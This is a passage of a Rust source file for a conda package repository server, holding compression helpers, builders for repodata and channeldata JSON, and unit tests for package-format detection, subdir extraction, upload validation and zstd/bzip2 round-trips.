fn serialize_msgpack_zst<T: serde::Serialize>(value: &T) -> Result<Vec<u8>, Response> {
    let msgpack = rmp_serde::to_vec(value).map_err(|e| {
        tracing::error!("msgpack serialization error: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;
    zstd_compress(&msgpack).map_err(|e| {
        tracing::error!("zstd compression error: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })
}

/// Compress data using bzip2.
fn bzip2_compress(data: &[u8]) -> Vec<u8> {
    let mut encoder = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
    encoder.write_all(data).expect("bzip2 write failed");
    encoder.finish().expect("bzip2 finish failed")
}

/// Compress data using zstd at compression level 3 (fast, good ratio).
fn zstd_compress(data: &[u8]) -> Result<Vec<u8>, std::io::Error> {
    zstd::encode_all(std::io::Cursor::new(data), 3)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Path/JSON builders (single source of truth; unit tests pin these against
// hardcoded literals so a format change here fails the tests — #2657)
// ---------------------------------------------------------------------------

/// Build the artifact path for a conda package.
fn build_conda_artifact_path(subdir: &str, filename: &str) -> String {
    format!("{}/{}", subdir, filename)
}

/// Build the storage key for a conda package.
fn build_conda_storage_key(repo_id: &uuid::Uuid, subdir: &str, filename: &str) -> String {
    format!("conda/{}/{}/{}", repo_id, subdir, filename)
}

/// The `package_format` metadata value for a conda package filename.
fn conda_package_format(filename: &str) -> &'static str {
    if filename.ends_with(".conda") {
        "v2"
    } else {
        "v1"
    }
}

/// Build the upload response JSON.
fn build_conda_upload_response(
    name: &str,
    version: &str,
    build_string: &str,
    subdir: &str,
    sha256: &str,
    size: i64,
) -> serde_json::Value {
    serde_json::json!({
        "name": name,
        "version": version,
        "build": build_string,
        "subdir": subdir,
        "sha256": sha256,
        "size": size,
    })
}

/// Build the base channeldata package entry (callers append optional fields).
fn build_channeldata_package_entry(subdirs: &[String], version: &str) -> serde_json::Value {
    serde_json::json!({
        "subdirs": subdirs,
        "version": version,
    })
}

/// Build the full channeldata.json envelope for a hosted repo.
fn build_channeldata_json(
    packages: &serde_json::Map<String, serde_json::Value>,
) -> serde_json::Value {
    serde_json::json!({
        "channeldata_version": 1,
        "packages": packages,
        "subdirs": KNOWN_SUBDIRS,
    })
}

/// Build the repodata.json envelope (CEP-15 `base_url` + `removed`).
fn build_repodata_envelope(
    subdir: &str,
    base_url: &str,
    packages: &serde_json::Map<String, serde_json::Value>,
    packages_conda: &serde_json::Map<String, serde_json::Value>,
    removed: &serde_json::Value,
) -> serde_json::Value {
    serde_json::json!({
        "info": {
            "subdir": subdir,
            "base_url": base_url,
        },
        "packages": packages,
        "packages.conda": packages_conda,
        "removed": removed,
        "repodata_version": 1,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::http::header::IF_NONE_MATCH;

    /// TEST FIXTURE: build a minimal repodata entry used as *input* to
    /// merge/filter tests. The production entry builder is
    /// `super::build_artifact_entry`.
    #[allow(clippy::too_many_arguments)]
    fn build_repodata_entry(
        name: &str,
        version: &str,
        build: &str,
        build_number: u64,
        depends: &serde_json::Value,
        md5: &str,
        sha256: &str,
        size: i64,
        subdir: &str,
    ) -> serde_json::Value {
        serde_json::json!({
            "name": name,
            "version": version,
            "build": build,
            "build_number": build_number,
            "depends": depends,
            "md5": md5,
            "sha256": sha256,
            "size": size,
            "subdir": subdir,
        })
    }

    /// TEST FIXTURE: build an (old-shape) repodata document used as *input* to
    /// merge/patch/filter tests. The production envelope (with CEP-15
    /// `base_url` and `removed`) is `super::build_repodata_envelope`, which has
    /// its own literal-pinned tests.
    fn build_repodata_json(
        subdir: &str,
        packages: &serde_json::Map<String, serde_json::Value>,
        packages_conda: &serde_json::Map<String, serde_json::Value>,
    ) -> serde_json::Value {
        serde_json::json!({
            "info": { "subdir": subdir },
            "packages": packages,
            "packages.conda": packages_conda,
            "repodata_version": 1,
        })
    }

    /// Extract the subdir from artifact metadata or path.
    fn extract_subdir(metadata: Option<&serde_json::Value>, path: &str) -> String {
        metadata
            .and_then(|m| m.get("subdir").and_then(|v| v.as_str()))
            .map(|s| s.to_string())
            .or_else(|| {
                path.split('/')
                    .next()
                    .filter(|s| !s.is_empty())
                    .map(|s| s.to_string())
            })
            .unwrap_or_else(|| "noarch".to_string())
    }

    /// Extract the package name from artifact metadata or use the artifact name.
    fn extract_package_name(metadata: Option<&serde_json::Value>, artifact_name: &str) -> String {
        metadata
            .and_then(|m| m.get("name").and_then(|v| v.as_str()))
            .map(|s| s.to_string())
            .unwrap_or_else(|| artifact_name.to_string())
    }

    // -----------------------------------------------------------------------
    // is_conda_package / is_conda_v2
    // -----------------------------------------------------------------------

    #[test]
    fn test_is_conda_package_v2() {
        assert!(is_conda_package("numpy-1.26.4-py312h02b7e37_0.conda"));
    }

    #[test]
    fn test_is_conda_package_v1() {
        assert!(is_conda_package("requests-2.31.0-pyhd8ed1ab_0.tar.bz2"));
    }

    #[test]
    fn test_is_conda_package_not_whl() {
        assert!(!is_conda_package("foo.whl"));
    }

    #[test]
    fn test_is_conda_package_not_rpm() {
        assert!(!is_conda_package("bar.rpm"));
    }

    #[test]
    fn test_is_conda_package_empty() {
        assert!(!is_conda_package(""));
    }

    #[test]
    fn test_is_conda_v2_true() {
        assert!(is_conda_v2("numpy-1.26.4-py312h02b7e37_0.conda"));
    }

    #[test]
    fn test_is_conda_v2_false_for_tar_bz2() {
        assert!(!is_conda_v2("requests-2.31.0-pyhd8ed1ab_0.tar.bz2"));
    }

    #[test]
    fn test_is_conda_v2_false_for_other() {
        assert!(!is_conda_v2("something.zip"));
    }

    // -----------------------------------------------------------------------
    // bzip2_compress
    // -----------------------------------------------------------------------

    #[test]
    fn test_bzip2_compress_non_empty() {
        let data = b"test data for bzip2 compression";
        let compressed = bzip2_compress(data);
        assert!(!compressed.is_empty());
        assert_ne!(compressed.as_slice(), data);
    }

    #[test]
    fn test_bzip2_compress_starts_with_magic() {
        let compressed = bzip2_compress(b"hello");
        // BZ2 magic: "BZ"
        assert!(compressed.len() >= 2);
        assert_eq!(compressed[0], b'B');
        assert_eq!(compressed[1], b'Z');
    }

    #[test]
    fn test_bzip2_compress_empty() {
        let compressed = bzip2_compress(b"");
        assert!(!compressed.is_empty()); // still produces valid bz2 output
    }

    // -----------------------------------------------------------------------
    // build_conda_artifact_path
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_conda_artifact_path_noarch() {
        assert_eq!(
            build_conda_artifact_path("noarch", "requests-2.31.0-pyhd8ed1ab_0.tar.bz2"),
            "noarch/requests-2.31.0-pyhd8ed1ab_0.tar.bz2"
        );
    }

    #[test]
    fn test_build_conda_artifact_path_linux64() {
        assert_eq!(
            build_conda_artifact_path("linux-64", "numpy-1.26.4-py312h02b7e37_0.conda"),
            "linux-64/numpy-1.26.4-py312h02b7e37_0.conda"
        );
    }

    #[test]
    fn test_build_conda_artifact_path_osx_arm64() {
        assert_eq!(
            build_conda_artifact_path("osx-arm64", "scipy-1.11.4-py312h2b1e342_0.conda"),
            "osx-arm64/scipy-1.11.4-py312h2b1e342_0.conda"
        );
    }

    // -----------------------------------------------------------------------
    // build_conda_storage_key
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_conda_storage_key_basic() {
        let id = uuid::Uuid::parse_str("00000000-0000-0000-0000-000000000001").unwrap();
        assert_eq!(
            build_conda_storage_key(&id, "noarch", "test.conda"),
            "conda/00000000-0000-0000-0000-000000000001/noarch/test.conda"
        );
    }

    #[test]
    fn test_build_conda_storage_key_linux() {
        let id = uuid::Uuid::new_v4();
        let key = build_conda_storage_key(&id, "linux-64", "numpy.conda");
        assert!(key.starts_with("conda/"));
        assert!(key.contains("linux-64"));
        assert!(key.ends_with("/numpy.conda"));
    }

    #[test]
    fn test_build_conda_storage_key_contains_repo_id() {
        let id = uuid::Uuid::parse_str("12345678-1234-1234-1234-123456789012").unwrap();
        let key = build_conda_storage_key(&id, "noarch", "pkg.tar.bz2");
        assert!(key.contains("12345678-1234-1234-1234-123456789012"));
    }

    // -----------------------------------------------------------------------
    // conda_content_type
    // -----------------------------------------------------------------------

    #[test]
    fn test_conda_content_type() {
        assert_eq!(
            conda_package_content_type("numpy.conda"),
            "application/octet-stream"
        );
        assert_eq!(
            conda_package_content_type("numpy.tar.bz2"),
            "application/x-tar"
        );
        assert_eq!(
            conda_package_content_type("file.zip"),
            "application/octet-stream"
        );
        assert_eq!(conda_package_content_type(""), "application/octet-stream");
    }

    // -----------------------------------------------------------------------
    // build_conda_metadata
    // -----------------------------------------------------------------------

    #[test]
    fn test_conda_package_format_v2() {
        assert_eq!(
            conda_package_format("numpy-1.26.4-py312h02b7e37_0.conda"),
            "v2"
        );
    }

    #[test]
    fn test_conda_package_format_v1() {
        assert_eq!(
            conda_package_format("requests-2.31.0-pyhd8ed1ab_0.tar.bz2"),
            "v1"
        );
    }

    // -----------------------------------------------------------------------
    // build_conda_upload_response
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_conda_upload_response_all_fields() {
        let resp =
            build_conda_upload_response("numpy", "1.26.4", "py312_0", "linux-64", "abc123", 4096);
        assert_eq!(resp["name"], "numpy");
        assert_eq!(resp["version"], "1.26.4");
        assert_eq!(resp["build"], "py312_0");
        assert_eq!(resp["subdir"], "linux-64");
        assert_eq!(resp["sha256"], "abc123");
        assert_eq!(resp["size"], 4096);
    }

    #[test]
    fn test_build_conda_upload_response_noarch() {
        let resp = build_conda_upload_response(
            "requests",
            "2.31.0",
            "pyhd8ed1ab_0",
            "noarch",
            "def456",
            1024,
        );
        assert_eq!(resp["subdir"], "noarch");
    }

    #[test]
    fn test_build_conda_upload_response_zero_size() {
        let resp = build_conda_upload_response("pkg", "1.0", "0", "noarch", "hash", 0);
        assert_eq!(resp["size"], 0);
    }

    // -----------------------------------------------------------------------
    // build_channeldata_package_entry
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_channeldata_package_entry_basic() {
        let subdirs = vec!["linux-64".to_string(), "noarch".to_string()];
        let entry = build_channeldata_package_entry(&subdirs, "1.26.4");
        assert_eq!(entry["version"], "1.26.4");
        let sds = entry["subdirs"].as_array().unwrap();
        assert_eq!(sds.len(), 2);
    }

    #[test]
    fn test_build_channeldata_package_entry_single_subdir() {
        let subdirs = vec!["noarch".to_string()];
        let entry = build_channeldata_package_entry(&subdirs, "2.0");
        assert_eq!(entry["subdirs"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn test_build_channeldata_package_entry_empty_subdirs() {
        let subdirs: Vec<String> = vec![];
        let entry = build_channeldata_package_entry(&subdirs, "1.0");
        assert!(entry["subdirs"].as_array().unwrap().is_empty());
    }

    // -----------------------------------------------------------------------
    // build_channeldata_json
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_channeldata_json_empty() {
        let packages = serde_json::Map::new();
        let cd = build_channeldata_json(&packages);
        assert_eq!(cd["channeldata_version"], 1);
        assert!(cd["packages"].as_object().unwrap().is_empty());
        assert!(!cd["subdirs"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_build_channeldata_json_with_package() {
        let mut packages = serde_json::Map::new();
        packages.insert(
            "numpy".to_string(),
            serde_json::json!({
                "subdirs": ["linux-64"],
                "version": "1.26.4",
            }),
        );
        let cd = build_channeldata_json(&packages);
        assert!(cd["packages"]["numpy"].is_object());
    }

    #[test]
    fn test_build_channeldata_json_has_known_subdirs() {
        let packages = serde_json::Map::new();
        let cd = build_channeldata_json(&packages);
        let subdirs = cd["subdirs"].as_array().unwrap();
        let noarch = subdirs.iter().any(|s| s.as_str() == Some("noarch"));
        assert!(noarch, "Known subdirs should include 'noarch'");
    }

    // -----------------------------------------------------------------------
    // build_repodata_envelope (production envelope; CEP-15 base_url + removed)
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_repodata_envelope_empty() {
        let packages = serde_json::Map::new();
        let packages_conda = serde_json::Map::new();
        let rd = build_repodata_envelope(
            "linux-64",
            "/conda/my-conda/linux-64/",
            &packages,
            &packages_conda,
            &serde_json::json!([]),
        );
        assert_eq!(rd["info"]["subdir"], "linux-64");
        assert_eq!(rd["info"]["base_url"], "/conda/my-conda/linux-64/");
        assert!(rd["packages"].as_object().unwrap().is_empty());
        assert!(rd["packages.conda"].as_object().unwrap().is_empty());
        assert!(rd["removed"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_build_repodata_envelope_with_packages() {
        let mut packages = serde_json::Map::new();
        packages.insert(
            "old.tar.bz2".to_string(),
            serde_json::json!({"name": "old"}),
        );
        let mut packages_conda = serde_json::Map::new();
        packages_conda.insert("new.conda".to_string(), serde_json::json!({"name": "new"}));
        let rd = build_repodata_envelope(
            "noarch",
            "/conda/my-conda/noarch/",
            &packages,
            &packages_conda,
            &serde_json::json!([]),
        );
        assert_eq!(rd["packages"]["old.tar.bz2"]["name"], "old");
        assert_eq!(rd["packages.conda"]["new.conda"]["name"], "new");
    }

    #[test]
    fn test_build_repodata_envelope_subdir_and_removed() {
        let packages = serde_json::Map::new();
        let packages_conda = serde_json::Map::new();
        let rd = build_repodata_envelope(
            "osx-arm64",
            "/conda/c/osx-arm64/",
            &packages,
            &packages_conda,
            &serde_json::json!(["gone-1.0-0.conda"]),
        );
        assert_eq!(rd["info"]["subdir"], "osx-arm64");
        assert_eq!(rd["removed"][0], "gone-1.0-0.conda");
    }

    #[test]
    fn test_build_repodata_envelope_has_repodata_version() {
        let packages = serde_json::Map::new();
        let packages_conda = serde_json::Map::new();
        let rd = build_repodata_envelope(
            "linux-64",
            "/conda/c/linux-64/",
            &packages,
            &packages_conda,
            &serde_json::json!([]),
        );
        assert_eq!(rd["repodata_version"], 1);
    }

    // -----------------------------------------------------------------------
    // Missing fields: fn, noarch, repodata_version, expanded subdirs (bead: artifact-keeper-akk)
    // -----------------------------------------------------------------------

    #[test]
    fn test_repodata_entry_has_fn_field_v2() {
        // The 'fn' field must be present in every repodata entry per conda spec
        let artifact = make_conda_artifact(
            "numpy",
            "linux-64/numpy-1.26.4-py312h02b7e37_0.conda",
            Some(serde_json::json!({
                "subdir": "linux-64",
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312h02b7e37_0",
                "build_number": 0,
                "depends": ["python >=3.12"],
                "constrains": [],
                "license": "BSD-3-Clause",
                "md5": "abc123"
            })),
        );
        let artifacts = vec![&artifact];
        let shard = build_shard("linux-64", &artifacts);
        let entry = &shard["packages.conda"]["numpy-1.26.4-py312h02b7e37_0.conda"];
        assert_eq!(entry["fn"], "numpy-1.26.4-py312h02b7e37_0.conda");
    }

    #[test]
    fn test_repodata_entry_has_fn_field_v1() {
        let artifact = make_conda_artifact(
            "requests",
            "noarch/requests-2.31.0-pyhd8ed1ab_0.tar.bz2",
            Some(serde_json::json!({
                "subdir": "noarch",
                "name": "requests",
                "version": "2.31.0",
                "build": "pyhd8ed1ab_0",
                "build_number": 0,
                "depends": [],
                "constrains": [],
                "license": "Apache-2.0"
            })),
        );
        let artifacts = vec![&artifact];
        let shard = build_shard("noarch", &artifacts);
        let entry = &shard["packages"]["requests-2.31.0-pyhd8ed1ab_0.tar.bz2"];
        assert_eq!(entry["fn"], "requests-2.31.0-pyhd8ed1ab_0.tar.bz2");
    }

    #[test]
    fn test_repodata_entry_has_noarch_for_noarch_package() {
        let artifact = make_conda_artifact(
            "six",
            "noarch/six-1.16.0-pyh6c4a22f_0.conda",
            Some(serde_json::json!({
                "subdir": "noarch",
                "name": "six",
                "version": "1.16.0",
                "build": "pyh6c4a22f_0",
                "build_number": 0,
                "depends": ["python"],
                "constrains": [],
                "license": "MIT",
                "noarch": "python"
            })),
        );
        let artifacts = vec![&artifact];
        let shard = build_shard("noarch", &artifacts);
        let entry = &shard["packages.conda"]["six-1.16.0-pyh6c4a22f_0.conda"];
        assert_eq!(entry["noarch"], "python");
    }

    #[test]
    fn test_repodata_entry_noarch_generic() {
        let artifact = make_conda_artifact(
            "font-ttf",
            "noarch/font-ttf-1.0-0.conda",
            Some(serde_json::json!({
                "subdir": "noarch",
                "name": "font-ttf",
                "version": "1.0",
                "build": "0",
                "build_number": 0,
                "depends": [],
                "constrains": [],
                "license": "OFL-1.1",
                "noarch": "generic"
            })),
        );
        let artifacts = vec![&artifact];
        let shard = build_shard("noarch", &artifacts);
        let entry = &shard["packages.conda"]["font-ttf-1.0-0.conda"];
        assert_eq!(entry["noarch"], "generic");
    }

    #[test]
    fn test_repodata_entry_no_noarch_for_arch_package() {
        // Non-noarch packages should not have the noarch field
        let artifact = make_conda_artifact(
            "numpy",
            "linux-64/numpy-1.26.4-py312h_0.conda",
            Some(serde_json::json!({
                "subdir": "linux-64",
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312h_0",
                "build_number": 0,
                "depends": ["python >=3.12"],
                "constrains": [],
                "license": "BSD-3-Clause"
            })),
        );
        let artifacts = vec![&artifact];
        let shard = build_shard("linux-64", &artifacts);
        let entry = &shard["packages.conda"]["numpy-1.26.4-py312h_0.conda"];
        assert!(
            entry.get("noarch").is_none(),
            "arch-specific package should not have noarch field"
        );
    }

    #[test]
    fn test_known_subdirs_includes_arm_platforms() {
        // ARM platforms added for IoT and embedded
        assert!(KNOWN_SUBDIRS.contains(&"linux-armv6l"));
        assert!(KNOWN_SUBDIRS.contains(&"linux-armv7l"));
        assert!(KNOWN_SUBDIRS.contains(&"win-arm64"));
        assert!(KNOWN_SUBDIRS.contains(&"linux-32"));
    }

    #[test]
    fn test_known_subdirs_sorted() {
        // noarch first, then alphabetically sorted
        assert_eq!(KNOWN_SUBDIRS[0], "noarch");
        let rest = &KNOWN_SUBDIRS[1..];
        for window in rest.windows(2) {
            assert!(
                window[0] < window[1],
                "{} should come before {}",
                window[0],
                window[1]
            );
        }
    }

    #[test]
    fn test_shard_entry_has_fn_field() {
        let artifact =
            make_full_conda_artifact("numpy", "1.26.4", "py312h_0", "linux-64", "conda", 4096);
        let refs = vec![&artifact];
        let shard = build_shard("linux-64", &refs);
        let entry = &shard["packages.conda"]["numpy-1.26.4-py312h_0.conda"];
        assert_eq!(entry["fn"], "numpy-1.26.4-py312h_0.conda");
    }

    #[test]
    fn test_shard_entry_has_noarch() {
        let mut artifact =
            make_full_conda_artifact("six", "1.16.0", "pyh_0", "noarch", "conda", 2048);
        artifact.metadata = Some(serde_json::json!({
            "subdir": "noarch",
            "name": "six",
            "noarch": "python",
            "version": "1.16.0",
            "build": "pyh_0",
            "build_number": 0,
            "depends": [],
            "constrains": [],
            "license": "MIT",
        }));
        let refs = vec![&artifact];
        let shard = build_shard("noarch", &refs);
        let entry = &shard["packages.conda"]["six-1.16.0-pyh_0.conda"];
        assert_eq!(entry["noarch"], "python");
    }

    #[test]
    fn test_md5_computed_during_v2_extraction() {
        // Build a minimal .conda v2 package with known content
        let mut zip_buf = Vec::new();
        {
            let mut zip_writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            let options = zip::write::SimpleFileOptions::default();
            zip_writer.start_file("metadata.json", options).unwrap();
            zip_writer
                .write_all(b"{\"name\":\"test\",\"version\":\"1.0\"}")
                .unwrap();
            zip_writer.finish().unwrap();
        }
        // The md5 should be computed from the raw bytes, not from metadata
        // This test verifies the code path computes md5 via the Md5 hasher
        let md5_hash = {
            use md5::Md5;
            let mut hasher = Md5::new();
            md5::Digest::update(&mut hasher, &zip_buf);
            format!("{:x}", md5::Digest::finalize(hasher))
        };
        assert_eq!(md5_hash.len(), 32, "MD5 hash should be 32 hex chars");
        assert!(md5_hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    // -----------------------------------------------------------------------
    // extract_subdir
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_subdir_from_metadata() {
        let meta = serde_json::json!({"subdir": "linux-64"});
        assert_eq!(extract_subdir(Some(&meta), "noarch/pkg.conda"), "linux-64");
    }

    #[test]
    fn test_extract_subdir_from_path() {
        assert_eq!(extract_subdir(None, "osx-arm64/numpy.conda"), "osx-arm64");
    }

    #[test]
    fn test_extract_subdir_no_info() {
        // When path is empty, default to "noarch"
        assert_eq!(extract_subdir(None, ""), "noarch");
    }

    #[test]
    fn test_extract_subdir_metadata_takes_priority() {
        let meta = serde_json::json!({"subdir": "linux-64"});
        assert_eq!(
            extract_subdir(Some(&meta), "osx-arm64/pkg.conda"),
            "linux-64"
        );
    }

    #[test]
    fn test_extract_subdir_metadata_without_subdir_key() {
        let meta = serde_json::json!({"name": "numpy"});
        assert_eq!(extract_subdir(Some(&meta), "win-64/pkg.conda"), "win-64");
    }

    // -----------------------------------------------------------------------
    // extract_package_name
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_package_name_from_metadata() {
        let meta = serde_json::json!({"name": "numpy"});
        assert_eq!(extract_package_name(Some(&meta), "fallback"), "numpy");
    }

    #[test]
    fn test_extract_package_name_no_metadata() {
        assert_eq!(extract_package_name(None, "artifact-name"), "artifact-name");
    }

    #[test]
    fn test_extract_package_name_metadata_without_name() {
        let meta = serde_json::json!({"version": "1.0"});
        assert_eq!(
            extract_package_name(Some(&meta), "fallback-name"),
            "fallback-name"
        );
    }

    #[test]
    fn test_extract_package_name_empty_metadata() {
        let meta = serde_json::json!({});
        assert_eq!(extract_package_name(Some(&meta), "name"), "name");
    }

    // -----------------------------------------------------------------------
    // artifacts_for_subdir
    // -----------------------------------------------------------------------

    fn make_conda_artifact(
        name: &str,
        path: &str,
        metadata: Option<serde_json::Value>,
    ) -> CondaArtifact {
        CondaArtifact {
            id: uuid::Uuid::new_v4(),
            path: path.to_string(),
            name: name.to_string(),
            version: Some("1.0".to_string()),
            size_bytes: 100,
            checksum_sha256: "hash".to_string(),
            storage_key: "key".to_string(),
            metadata,
        }
    }

    #[test]
    fn test_artifacts_for_subdir_by_metadata() {
        let artifacts = vec![
            make_conda_artifact(
                "numpy",
                "linux-64/numpy.conda",
                Some(serde_json::json!({"subdir": "linux-64"})),
            ),
            make_conda_artifact(
                "requests",
                "noarch/requests.conda",
                Some(serde_json::json!({"subdir": "noarch"})),
            ),
        ];
        let filtered = artifacts_for_subdir(&artifacts, "linux-64");
        assert_eq!(filtered.len(), 1);
        assert_eq!(filtered[0].name, "numpy");
    }

    #[test]
    fn test_artifacts_for_subdir_by_path_prefix() {
        let artifacts = vec![make_conda_artifact("scipy", "osx-arm64/scipy.conda", None)];
        let filtered = artifacts_for_subdir(&artifacts, "osx-arm64");
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_artifacts_for_subdir_empty() {
        let artifacts: Vec<CondaArtifact> = vec![];
        let filtered = artifacts_for_subdir(&artifacts, "noarch");
        assert!(filtered.is_empty());
    }

    #[test]
    fn test_artifacts_for_subdir_no_match() {
        let artifacts = vec![make_conda_artifact(
            "pkg",
            "linux-64/pkg.conda",
            Some(serde_json::json!({"subdir": "linux-64"})),
        )];
        let filtered = artifacts_for_subdir(&artifacts, "win-64");
        assert!(filtered.is_empty());
    }

    // -----------------------------------------------------------------------
    // KNOWN_SUBDIRS
    // -----------------------------------------------------------------------

    #[test]
    fn test_known_subdirs() {
        assert!(KNOWN_SUBDIRS.len() >= 9);
        assert!(KNOWN_SUBDIRS.contains(&"noarch"));
        assert!(KNOWN_SUBDIRS.contains(&"linux-64"));
        assert!(KNOWN_SUBDIRS.contains(&"osx-arm64"));
    }

    // -----------------------------------------------------------------------
    // extract_basic_credentials
    // -----------------------------------------------------------------------
    // =======================================================================
    // Conda compliance tests (maps to GitHub issue #282)
    // =======================================================================

    // -----------------------------------------------------------------------
    // zstd compression (bead: artifact-keeper-qd0)
    // -----------------------------------------------------------------------

    #[test]
    fn test_zstd_compress_non_empty() {
        let data = b"test data for zstd compression";
        let compressed = zstd_compress(data).unwrap();
        assert!(!compressed.is_empty());
        assert_ne!(compressed.as_slice(), data.as_slice());
    }

    #[test]
    fn test_zstd_compress_starts_with_magic() {
        let compressed = zstd_compress(b"hello zstd").unwrap();
        // Zstd magic number: 0xFD2FB528 (little-endian)
        assert!(compressed.len() >= 4);
        assert_eq!(compressed[0], 0x28);
        assert_eq!(compressed[1], 0xB5);
        assert_eq!(compressed[2], 0x2F);
        assert_eq!(compressed[3], 0xFD);
    }

    #[test]
    fn test_zstd_compress_empty() {
        let compressed = zstd_compress(b"").unwrap();
        assert!(!compressed.is_empty()); // still produces valid zstd output
    }

    #[test]
    fn test_zstd_compress_roundtrip() {
        let original = br#"{"info":{"subdir":"linux-64"},"packages":{},"packages.conda":{}}"#;
        let compressed = zstd_compress(original).unwrap();
        let decompressed = zstd::decode_all(std::io::Cursor::new(&compressed)).unwrap();
        assert_eq!(decompressed, original);
    }

    #[test]
    fn test_zstd_compress_large_repodata() {
        // Simulate a large repodata.json (100KB+)
        let mut large_json = String::from(r#"{"info":{"subdir":"linux-64"},"packages":{"#);
        for i in 0..1000 {
            if i > 0 {
                large_json.push(',');
            }
            large_json.push_str(&format!(
                r#""pkg-{}-1.0-build_{}.tar.bz2":{{"name":"pkg-{}","version":"1.0","build":"build_{}","build_number":0,"depends":[],"sha256":"abc","size":100,"subdir":"linux-64"}}"#,
                i, i, i, i
            ));
        }
        large_json.push_str(r#"},"packages.conda":{}}"#);

        let compressed = zstd_compress(large_json.as_bytes()).unwrap();
        // zstd should compress this well (lots of repetition)
        assert!(
            compressed.len() < large_json.len() / 2,
            "zstd should compress repetitive data well: {} vs {}",
            compressed.len(),
            large_json.len()
        );

        // Verify roundtrip
        let decompressed = zstd::decode_all(std::io::Cursor::new(&compressed)).unwrap();
        assert_eq!(decompressed, large_json.as_bytes());
    }

    // -----------------------------------------------------------------------
    // .conda v2 metadata extraction (bead: artifact-keeper-9k7)
    // -----------------------------------------------------------------------

    /// Build a minimal .conda (v2) package as a ZIP containing an info tar.zst
    /// with info/index.json inside it.
    fn build_test_conda_v2_package(index_json: &serde_json::Value) -> Vec<u8> {
        let index_bytes = serde_json::to_vec(index_json).unwrap();

        // Build the info tar
        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }

        // Compress the tar with zstd
        let compressed_tar = zstd::encode_all(std::io::Cursor::new(&tar_buf), 3).unwrap();

        // Build the outer ZIP
        let mut zip_buf = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);

            // metadata.json (minimal, conda v2 always has this)
            writer.start_file("metadata.json", options).unwrap();
            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();

            // info-pkg-1.0-build.tar.zst
            writer
                .start_file("info-pkg-1.0-build_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &compressed_tar).unwrap();

            writer.finish().unwrap();
        }

        zip_buf
    }

    /// Build a minimal .tar.bz2 (v1) conda package with info/index.json.
    fn build_test_conda_v1_package(index_json: &serde_json::Value) -> Vec<u8> {
        let index_bytes = serde_json::to_vec(index_json).unwrap();

        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }

        // Compress with bzip2
        bzip2_compress(&tar_buf)
    }

    // -----------------------------------------------------------------------
    // Upload validation (bead: artifact-keeper-4rn)
    // -----------------------------------------------------------------------

    #[test]
    fn test_validate_v2_package_valid() {
        let index = serde_json::json!({
            "name": "test-pkg",
            "version": "1.0.0",
            "build": "py312_0",
            "build_number": 0,
            "depends": [],
            "constrains": [],
            "license": "MIT",
            "subdir": "linux-64"
        });
        let package = build_test_conda_v2_package(&index);
        let result = validate_conda_package(&package, "test-pkg-1.0.0-py312_0.conda");
        assert!(
            result.is_ok(),
            "Valid .conda package should pass: {:?}",
            result
        );
    }

    #[test]
    fn test_validate_v2_package_invalid_zip() {
        let result = validate_conda_package(b"not a zip file", "pkg.conda");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not a valid ZIP"));
    }

    #[test]
    fn test_validate_v2_package_missing_info_tar() {
        // ZIP without info-*.tar.zst
        let mut zip_buf = Vec::new();
        {
            let mut zip_writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            let options = zip::write::SimpleFileOptions::default();
            zip_writer.start_file("metadata.json", options).unwrap();
            zip_writer.write_all(b"{\"name\":\"test\"}").unwrap();
            zip_writer.finish().unwrap();
        }
        let result = validate_conda_package(&zip_buf, "test.conda");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("missing info-*.tar.zst"));
    }

    #[test]
    fn test_validate_v1_package_valid() {
        let index = serde_json::json!({
            "name": "test-pkg",
            "version": "2.0.0",
            "build": "0",
            "depends": [],
        });
        let package = build_test_conda_v1_package(&index);
        let result = validate_conda_package(&package, "test-pkg-2.0.0-0.tar.bz2");
        assert!(
            result.is_ok(),
            "Valid .tar.bz2 package should pass: {:?}",
            result
        );
    }

    /// #4067: a pbzip2/lbzip2-written v1 package is a sequence of independent
    /// bzip2 streams over one tar. Both the upload validation walk and the
    /// metadata extraction must keep reading past the first stream boundary.
    #[test]
    fn test_validate_and_extract_v1_multistream_bzip2() {
        let index = serde_json::json!({
            "name": "testpkg",
            "version": "1.0.0",
            "build": "py310_0",
            "depends": [],
        });
        let index_bytes = serde_json::to_vec(&index).unwrap();

